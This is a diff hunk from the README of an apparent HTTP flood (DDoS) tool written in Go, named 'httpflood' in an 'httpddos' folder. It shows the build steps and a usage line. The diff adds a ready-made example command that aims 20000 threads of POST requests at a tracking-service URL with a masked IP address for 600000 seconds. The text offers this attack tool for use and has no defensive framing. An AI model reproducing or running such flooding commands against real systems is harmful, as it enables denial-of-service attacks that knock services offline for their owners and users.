@@ -43,3 +43,5 @@ Or anything else of http header. If you don't have any idea of this please just 
     cd httpddos
     go build httpflood.go
     ./httpflood  <url> <threads> <get/post> <seconds> <header.txt/nil>
+    
+    ./httpflood https://x.x.x.x/traking/service 20000 post 600000 header.txt
